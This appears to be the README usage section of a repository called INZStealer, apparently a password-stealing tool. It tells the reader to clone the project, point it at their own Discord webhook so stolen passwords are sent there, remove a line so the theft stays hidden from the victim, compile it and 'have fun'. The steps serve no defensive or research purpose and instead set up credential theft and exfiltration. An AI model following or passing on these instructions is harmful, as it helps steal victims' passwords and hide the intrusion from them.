# HOW TO USE
  
  - Clone the repo
  - Edit [this](https://github.com/InstinctEx/INZStealer/blob/0af614f41534abaf33f0ea8a28e0eb61e81372f8/INZStealer/Program.cs#L24) to your discord webhook
  - If you want it to be stealthy, delete the open file [line](https://github.com/InstinctEx/INZStealer/blob/0af614f41534abaf33f0ea8a28e0eb61e81372f8/INZStealer/Program.cs#L67) so all passwords just don't pop up in your screen.
  - Compile it
  - Have Fun!
